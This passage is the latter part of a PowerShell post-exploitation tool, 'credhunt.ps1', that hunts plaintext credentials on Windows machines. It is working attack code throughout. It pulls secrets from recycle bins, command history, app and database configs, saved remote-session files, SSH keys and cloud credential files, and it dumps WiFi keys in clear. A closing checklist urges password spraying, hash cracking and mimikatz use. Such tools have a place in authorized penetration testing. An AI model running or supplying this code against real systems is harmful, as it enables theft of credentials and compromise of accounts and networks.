    $sids = @()
    try {
        $sids = Get-ChildItem -LiteralPath $rb -Force -ErrorAction SilentlyContinue |
                Where-Object { $_.PSIsContainer -and $_.Name -match '^S-1-' }
    } catch { }
    foreach ($sdir in $sids) {
        # map SID -> account (best effort; $S-1-5-21-* only on live, trusted fallback is the SID)
        $acct = $sdir.Name
        try {
            $acct = (New-Object System.Security.Principal.SecurityIdentifier($sdir.Name)).Translate([System.Security.Principal.NTAccount]).Value
        } catch { }
        $items = @()
        try {
            $items = Get-ChildItem -LiteralPath $sdir.FullName -Force -ErrorAction SilentlyContinue |
                     Where-Object { -not $_.PSIsContainer -and $_.Name -like '$I*' }
        } catch { }
        if (-not $items -or $items.Count -eq 0) { continue }
        Sub ("bin for $acct  (" + $items.Count + " deleted file(s))")
        foreach ($i in $items) {
            $meta = Read-RecycleIFile $i.FullName
            $rname = $i.Name -replace '^\$I','$R'
            $rpath = Join-Path $sdir.FullName $rname
            $orig  = if ($meta.OriginalPath) { $meta.OriginalPath } else { '<unknown>' }
            $when  = if ($meta.DeletedUtc)   { $meta.DeletedUtc.ToString('u') } else { '?' }
            # interesting on name/ext alone?
            $leaf = Split-Path $orig -Leaf
            $ext  = [System.IO.Path]::GetExtension($leaf).ToLower()
            $nameLoot = ($RBIN_LOOT_EXT[$ext] -or $leaf -match $RBIN_LOOT_RE)
            $any = $true
            if ($nameLoot) { Crit "deleted $when : $orig" } else { FileHit "deleted $when : $orig" }
            if (Test-Path -LiteralPath $rpath -PathType Leaf -ErrorAction SilentlyContinue) {
                NoteW "  on disk: $rpath"
                # content grep (text-y files only; respects MaxBytes via Grep-One)
                $m = Grep-One -Path $rpath -Pattern $CRED_RE
                if ($m.Count -gt 0) { Show-Lines $m }
            }
        }
    }
    if (-not $any) { Note 'empty (no deleted files found in any user bin)' }
}

function Scan-History {
    Sect 'Command history / transcripts'
    # history-specific: commands that carry a secret inline
    $HIST_RE = '(?:net\s+user\s+\S+\s+\S+|-AsPlainText|ConvertTo-SecureString|cmdkey\s+/add|net\s+use\s+.*/user|runas\s+/user|psexec.*\s-p\s|-Credential)'
    foreach ($h in (User-Homes)) {
        $psh = Join-Path $h 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
        if (PathLeaf $psh) {
            FileHit "$psh  (PowerShell history - very high yield)"
            $m = Grep-One -Path $psh -Pattern ('(?:' + $CRED_RE + '|' + $HIST_RE + ')')
            if ($m.Count -gt 0) { Show-Lines $m } else { Note 'present, no obvious secrets matched' }
        }
        foreach ($t in (Resolve-Glob (Join-Path $h 'Documents\PowerShell_transcript*'))) {
            $m = Grep-One -Path $t -Pattern ('(?:' + $CRED_RE + '|' + $HIST_RE + ')')
            if ($m.Count -gt 0) { FileHit "$t  (PS transcript)"; Show-Lines $m }
        }
    }
    if (-not $IsOffline) {
        Sub 'cmdkey /list (Credential Manager targets)'
        try {
            $ck = cmdkey /list 2>$null
            if ($ck) {
                $lines = @(Filter-CmdkeyLines $ck)
                if ($lines.Count -gt 0) { Show-Lines $lines; Note 'use: runas /savecred, or mimikatz/SharpDPAPI as this user to recover the blob' }
                elseif ((@($ck) -match 'virtualapp/didlogical').Count -gt 0) { Note 'no saved creds (only the stock WindowsLive virtualapp/didlogical entry - hidden)' }
                else { Note 'no saved Credential Manager targets' }
            }
        } catch { }
    }
}

# --- web / application configs ---------------------------------------------
function Scan-Web {
    Sect 'Web / application configs'
    $n = 0
    Grep-Paths $CRED_RE @((BP 'Windows\System32\inetsrv\config\applicationHost.config')) $NOISE_RE 'IIS'
    $n += $script:LastGrepCount
    $cfgs = Fs-ByName @('web.config','applicationHost.config','appsettings*.json','*.config',
                        '.env','.env.*','tomcat-users.xml','context.xml','server.xml',
                        'settings.py','wp-config.php','config.php','configuration.php','local.xml')
    Grep-Dirs ('(?:' + $CRED_RE + '|' + $CONNFN_RE + ')') $cfgs
    $n += $script:LastGrepCount
    if (-not $n) { Note 'no web/app config secrets found' }
}

# --- database configs ------------------------------------------------------
function Scan-DB {
    Sect 'Database configs'
    $n = 0
    foreach ($h in (User-Homes)) {
        foreach ($f in @('.my.cnf','_mysql_history','.mysql_history','.psql_history','.pgpass','.dbshell','.mongorc.js')) {
            $p = Join-Path $h $f
            $m = Grep-One -Path $p -Pattern ('(?:' + $CRED_RE + '|' + $URI + ')') -Noise $null
            if ($m.Count -gt 0) { FileHit "$p"; Show-Lines $m; $n++ }
        }
    }
    $dbcfg = Fs-ByName @('my.ini','my.cnf','postgresql.conf','pg_hba.conf','mongod.conf','mongod.cfg','.pgpass')
    Grep-Dirs $CRED_RE $dbcfg
    $n += $script:LastGrepCount
    if (-not $n) { Note 'no database config secrets found' }
}

# mRemoteNG confCons.xml: every <Node> is written as ONE long attribute-heavy
# line, easily over a thousand chars - too long for Grep-One's generic-noise
# line-length guard, and too long to trust to Show-File's raw/truncated dump
# (the password could be cut off depending on attribute order). Parse it
# directly instead: read the whole file, regex out Name/Hostname/Username/
# Domain/Password per <Node>, and report only nodes that actually have a
# stored password. mRemoteNG falls back to a well-known, PUBLISHED default
# AES key whenever no master password was set on the box, so this is
# plaintext-equivalent exactly like GPP cpassword.
# Result in $script:LastShowFile - NEVER via `return` (same reason as
# Grep-Paths/Grep-Dirs/Show-File: Val/Note share the Write-Output pipeline,
# and `if (Scan-MRemoteNG ...)` would otherwise evaluate the function call in
# boolean context, capturing - and so silently discarding from the console -
# every bit of display text it produced just to test truthiness).
function Scan-MRemoteNG {
    param([string]$Path,[string]$Tag)
    if (-not (PathLeaf $Path)) { $script:LastShowFile = $false; return }
    try {
        $txt = Get-Content -LiteralPath $Path -Raw -ErrorAction SilentlyContinue
    } catch { $script:LastShowFile = $false; return }
    if (-not $txt) { $script:LastShowFile = $false; return }
    $nodeRe = [regex]'(?is)<Node\b[^>]*?/?>'
    $found = $false
    foreach ($nm in $nodeRe.Matches($txt)) {
        $node = $nm.Value
        $pw = [regex]::Match($node, 'Password\s*=\s*"([^"]*)"')
        if (-not $pw.Success -or -not $pw.Groups[1].Value) { continue }
        $found = $true
        $name = [regex]::Match($node, 'Name\s*=\s*"([^"]*)"')
        $host2 = [regex]::Match($node, 'Hostname\s*=\s*"([^"]*)"')
        $user = [regex]::Match($node, 'Username\s*=\s*"([^"]*)"')
        $dom  = [regex]::Match($node, 'Domain\s*=\s*"([^"]*)"')
        Val ("mRemoteNG '{0}' ({1}) {2}User={3} Password={4}" -f `
            $(if ($name.Success) { $name.Groups[1].Value } else { '?' }),
            $(if ($host2.Success) { $host2.Groups[1].Value } else { '?' }),
            $(if ($dom.Success -and $dom.Groups[1].Value) { "Domain=$($dom.Groups[1].Value) " } else { '' }),
            $(if ($user.Success) { $user.Groups[1].Value } else { '?' }),
            $pw.Groups[1].Value)
    }
    if ($found) { Note "$Path  ($Tag) - decrypt with mRemoteNG's default AES key if no master password was set" }
    $script:LastShowFile = $found
}

# --- saved sessions (SCP/FTP/RDP/remote managers) --------------------------
function Scan-Sessions {
    Sect 'Saved sessions (WinSCP / FileZilla / RDP / mRemoteNG)'
    $n = 0
    # mRemoteNG: per-user AND the machine-wide ProgramData install - a real
    # miss found live (confCons.xml showed up in C:\ProgramData, not AppData).
    $mrng = @()
    foreach ($h in (User-Homes)) { $mrng += (Join-Path $h 'AppData\Roaming\mRemoteNG\confCons.xml') }
    $mrng += (BP 'ProgramData\mRemoteNG\confCons.xml')
    foreach ($p in $mrng) {
        Scan-MRemoteNG -Path $p -Tag 'mRemoteNG'
        if ($script:LastShowFile) { $n++ }
    }
    foreach ($h in (User-Homes)) {
        $sess = @(
            @((Join-Path $h 'AppData\Roaming\WinSCP.ini'), 'WinSCP (encrypted unless master pw unset)'),
            @((Join-Path $h 'Documents\WinSCP.ini'), 'WinSCP'),
            @((Join-Path $h 'AppData\Roaming\FileZilla\sitemanager.xml'), 'FileZilla sitemanager'),
            @((Join-Path $h 'AppData\Roaming\FileZilla\recentservers.xml'), 'FileZilla recentservers'),
            @((Join-Path $h 'Documents\SuperPuTTY\Sessions.xml'), 'SuperPuTTY')
        )
        foreach ($pair in $sess) {
            $p = $pair[0]
            if (PathLeaf $p) {
                Show-File $p 40 $pair[1]; $n++
            }
        }
        foreach ($rdp in (Resolve-Glob (Join-Path $h 'Documents\*.rdp'))) {
            $m = Grep-One -Path $rdp -Pattern 'password 51:b:|username:s:' -Noise $null
            FileHit "$rdp  (.rdp - 'password 51:b:' is DPAPI per-user)"; if ($m.Count) { Show-Lines $m }; $n++
        }
    }
    if (-not $n) { Note 'no saved session files found' }
}

# --- SSH keys / configs ----------------------------------------------------
function Scan-SSH {
    Sect 'SSH keys / configs'
    $n = 0
    foreach ($h in (User-Homes)) {
        $sd = Join-Path $h '.ssh'
        if (-not (PathDir $sd)) { continue }
        foreach ($f in (Get-ChildItem -LiteralPath $sd -Force -ErrorAction SilentlyContinue | Where-Object { -not $_.PSIsContainer })) {
            $fp = $f.FullName
            $kh = Grep-One -Path $fp -Pattern ('(?:' + $KEY_RE + '|' + $PPK_RE + ')') -Noise $null
            if ($kh.Count -gt 0) { Crit "$fp  (private key)"; $n++ }
            elseif ($f.Name -match '^(config|known_hosts|authorized_keys)$') { Show-File $fp 20 'ssh'; $n++ }
        }
    }
    if (-not $n) { Note 'no .ssh material found' }
}

# --- scheduled tasks -------------------------------------------------------
function Scan-Tasks {
    Sect 'Scheduled task definitions'
    $troot = (BP 'Windows\System32\Tasks')
    if (-not (PathDir $troot)) { Note 'no Tasks folder'; return }
    $n = 0
    foreach ($f in (Walk-Files -Roots @($troot))) {
        $m = Grep-One -Path $f -Pattern ('(?:' + $CRED_RE + '|<Command>|<Arguments>)')
        if ($m.Count -gt 0) {
            $hasCred = $false; foreach ($l in $m) { if ($l -notmatch '<Command>|<Arguments>') { $hasCred = $true } }
            if ($hasCred) { Crit "$f  (task carries a credential)" } else { FileHit $f }
            Show-Lines $m; $n++
        }
    }
    if (-not $n) { Note 'no task definitions with inline commands/creds' }
}

# --- WiFi profiles (live) --------------------------------------------------
function Scan-Network {
    Sect 'WiFi profiles / network creds'
    if ($IsOffline) { Note 'skipped (offline -Root scan)'; return }
    try {
        $out = netsh wlan show profiles 2>$null
        $profiles = @()
        foreach ($l in $out) { if ($l -match 'All User Profile\s*:\s*(.+)$') { $profiles += $Matches[1].Trim() } }
        if ($profiles.Count -eq 0) { Note 'no WiFi profiles'; return }
        foreach ($pr in $profiles) {
            $d = netsh wlan show profile name="$pr" key=clear 2>$null
            foreach ($l in $d) { if ($l -match 'Key Content\s*:\s*(.+)$') { Val "WiFi '$pr' key: $($Matches[1].Trim())" } }
        }
    } catch { Note 'netsh wlan unavailable' }
}

# --- DevOps / cloud credential files ---------------------------------------
function Scan-DevOps {
    Sect 'DevOps / cloud credentials'
    $n = 0
    foreach ($h in (User-Homes)) {
        $devs = @('.aws\credentials','.aws\config','.git-credentials','.netrc','_netrc',
                  '.docker\config.json','.npmrc','.pypirc','.s3cfg',
                  '.kube\config','.azure\accessTokens.json','AppData\Roaming\gcloud\credentials.db')
        foreach ($rel in $devs) {
            $p = Join-Path $h $rel
            if (PathLeaf $p) {
                $m = Grep-One -Path $p -Pattern ('(?:' + $CRED_RE + '|' + $TOKEN_RE + '|' + $URI + ')') -Noise $null
                if ($m.Count -gt 0) { Crit "$p"; Show-Lines $m } else { FileHit "$p  (inspect - likely tokens)" }
                $n++
            }
        }
    }
    if (-not $n) { Note 'no devops/cloud credential files found' }
}

# --- name-based loot (names that advertise secrets) ------------------------
function Scan-NameLoot {
    Sect 'Files whose names advertise secrets'
    # keystores / key files - interesting by extension alone
    $keystores = Fs-ByName @('*.kdbx','*.kdb','*.pfx','*.p12','*.jks','*.ppk','*.ovpn',
                             'id_rsa','id_rsa.*','id_dsa','id_ecdsa','id_ed25519')
    # word candidates (broad glob), then keep only those whose LEAF contains the
    # keyword as a whole word ($NAME_RE) - kills compass/bypass/passage FPs.
    $cands = Fs-ByName @('*pass*','*cred*','*secret*','*apikey*','*api_key*','*vault*')
    $words = @()
    foreach ($f in $cands) { if ((Split-Path $f -Leaf) -match $NAME_RE) { $words += $f } }

    $seen = @{}; $any = $false
    foreach ($f in $keystores) {
        $k = $f.ToLower(); if ($seen[$k]) { continue }; $seen[$k] = $true; $any = $true
        Crit "$f  (keystore/keyfile - crack offline)"
    }
    foreach ($f in $words) {
        $k = $f.ToLower(); if ($seen[$k]) { continue }; $seen[$k] = $true; $any = $true
        $m = Grep-One -Path $f -Pattern $CRED_RE
        if ($m.Count -gt 0) { Crit "$f"; Show-Lines $m } else { FileHit "$f" }
    }
    if (-not $any) { Note 'none' }
}

# --- process command lines (live) ------------------------------------------
function Scan-Procs {
    Sect 'Process command lines'
    if ($IsOffline) { Note 'skipped (offline -Root scan)'; return }
    $n = 0
    try {
        $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
        foreach ($p in $procs) {
            $cl = $p.CommandLine
            if (-not $cl) { continue }
            if (Test-ProcCred $cl) {
                $s = $cl; if ($s.Length -gt $MAXCOL) { $s = $s.Substring(0,$MAXCOL) }
                Crit ("pid {0} {1}: {2}" -f $p.ProcessId, $p.Name, $s); $n++
            }
        }
    } catch { }
    if (-not $n) { Note 'no process command lines carry visible creds' }
}

# ===========================================================================
# SECTION 6 - PATTERN SWEEP
# Layer 2: for credentials in files nobody could list in advance. Default mode
# sweeps the warmed curated list; -Deep walks the whole drive (slow). -Quick
# skips this entirely. Select-String is slow, so this is deliberately last and
# runs over the already-pruned file set.
# ===========================================================================
function Scan-Generic {
    Sect 'Pattern sweep'
    if ($Quick) { Note 'skipped (-Quick)'; return }
    $files = Fs-Files
    if ($Deep) {
        Note 'deep mode: walking the entire drive (slow)...'
        $files = Walk-Files -Roots @($Base) -SkipBig
    }
    # In default mode, keep the content sweep out of the big vendor trees
    # (Program Files / Windows): they are overwhelmingly generated noise, and
    # their real configs are already covered by the name-based web/db scans.
    # -Deep opts back into the exhaustive whole-disk sweep.
    $skipRoots = @()
    if (-not $Deep) {
        foreach ($r in @((BP 'Program Files'), (BP 'Program Files (x86)'), (BP 'Windows'))) {
            $skipRoots += $r.ToLower()
        }
    }
    # content sweep only over config/script/text files (speed + signal)
    $sweep = @()
    foreach ($f in $files) {
        $lf = $f.ToLower()
        $skip = $false
        foreach ($sr in $skipRoots) { if ($lf.StartsWith($sr + '\')) { $skip = $true; break } }
        if ($skip) { continue }
        $ext = ([System.IO.Path]::GetExtension($f)).ToLower()
        if ($TEXT_EXT[$ext]) { $sweep += $f; continue }
        if ($ext -eq '' -and $NOEXT_OK[(Split-Path $f -Leaf).ToLower()]) { $sweep += $f }
    }
    $pat = '(?:' + $CRED_RE + '|' + $TOKEN_RE + '|' + $CPASSWORD + '|' + $HASH_RE + '|' + $KEY_RE + ')'
    Grep-Dirs $pat $sweep
    $n = $script:LastGrepCount
    if (-not $n) { Note 'no additional matches in sweep' }
}

# ===========================================================================
# SECTION 7 - BANNER, SECTION RUNNER, SUMMARY, MAIN
# ===========================================================================
function Banner {
    Emit $C_SEC ''
    Emit $C_SEC "  credhunt.ps1 v$VERSION - Windows plaintext credential hunter (READ-ONLY)"
    $mode = if ($Quick) { 'quick' } elseif ($Deep) { 'deep' } else { 'default' }
    $who = $env:USERNAME
    try { $w = whoami 2>$null; if ($w) { $who = (@($w))[0] } } catch { }
    Emit $C_INFO ("  host={0}  user={1}  mode={2}  base={3}  maxKB={4}  maxhits={5}" -f `
        $env:COMPUTERNAME, $who, $mode, $Base, $MaxSizeKB, $MaxHits)
    if ($IsOffline) { Emit $C_INFO '  offline -Root scan: live registry/process/wifi sections are skipped' }
    if ($script:SelfDirExcluded) {
        Emit $C_INFO "  skipping script folder (your toolkit): $($script:SelfDir)  [-NoSelfExclude to scan it]"
    } elseif ($script:SelfDir -and -not $NoSelfExclude) {
        Emit $C_INFO "  script folder $($script:SelfDir) is a shared location - not auto-skipped; use -Exclude for your tools"
    }
    Emit $C_SEC '  Authorized testing only. Spray what you find; nothing here is decrypted.'
}

function Summary {
    Sect 'Follow-up checklist'
    Emit $C_INFO '  1. Password reuse: spray every string found against every local user and the domain'
    Emit $C_INFO '     (net user  /  net localgroup administrators  /  Get-LocalUser)'
    Emit $C_INFO '  2. Hashes -> hashcat/john:  NTLM=1000  NetNTLMv2=5600  $6$=1800  $2y$=3200  .pfx=pfx2john'
    Emit $C_INFO '  3. GPP cpassword -> gpp-decrypt (AES key is public). Unattend base64 is decoded above.'
    Emit $C_INFO '  4. SAM/SYSTEM/SECURITY copies -> secretsdump.py LOCAL. VNC blob -> fixed-DES vncpwd.'
    Emit $C_INFO '  5. DPAPI (cmdkey targets, .rdp, WinSCP, Credential Mgr) -> mimikatz/SharpDPAPI as that user.'
    Emit $C_INFO '  6. Re-run as SYSTEM/admin after privesc - you will read hives and other users you could not.'
    Emit $C_INFO '  7. Not covered here (use winPEAS/PrivescCheck): service perms, AlwaysInstallElevated, token privs.'
    if ($OutFile) { Emit $C_INFO "  Results also written to: $OutFile" }

    Sect 'Time per section (slowest first)'
    $script:Timings | Sort-Object Seconds -Descending | Select-Object -First 8 | ForEach-Object {
        Emit $C_INFO ("  {0,6:N1}s  {1}" -f $_.Seconds, $_.Name)
    }
    Emit $C_SEC ''
    Emit $C_SEC ("done in {0:N0}s." -f ((Get-Date) - $script:StartT).TotalSeconds)
    if ($script:OutWriter) { try { $script:OutWriter.Flush(); $script:OutWriter.Close() } catch { } }
}

# Run one section, timing it; a thrown error becomes a note, never fatal.
$script:Timings = @()
function Run-Section {
    param([string]$Name,[scriptblock]$Fn)
    $t0 = Get-Date
    try { & $Fn } catch { Note ("section {0} error: {1}" -f $Name, $_.Exception.Message) }
    $script:Timings += (New-Object PSObject -Property @{ Name = $Name; Seconds = ((Get-Date) - $t0).TotalSeconds })
}

function Main {
    $script:StartT = Get-Date
    Banner
    if (-not $Quick) { Run-Section 'warm-walk' { Fs-Warm } }
    Run-Section 'answer-files'  { Scan-Answerfiles }
    Run-Section 'gpp'           { Scan-GPP }
    Run-Section 'registry'      { Scan-Registry }
    Run-Section 'hives'         { Scan-Hives }
    Run-Section 'recyclebin'    { Scan-RecycleBin }
    Run-Section 'history'       { Scan-History }
    Run-Section 'web'           { Scan-Web }
    Run-Section 'db'            { Scan-DB }
    Run-Section 'sessions'      { Scan-Sessions }
    Run-Section 'ssh'           { Scan-SSH }
    Run-Section 'tasks'         { Scan-Tasks }
    Run-Section 'network'       { Scan-Network }
    Run-Section 'devops'        { Scan-DevOps }
    Run-Section 'nameloot'      { Scan-NameLoot }
    Run-Section 'procs'         { Scan-Procs }
    Run-Section 'generic-sweep' { Scan-Generic }
    Summary
}

# Run Main ONLY when executed, not when dot-sourced by a fixture harness
# (dot-sourcing sets InvocationName to '.'). This lets the tests load every
# pattern/function without launching a scan.
if ($MyInvocation.InvocationName -ne '.') { Main }
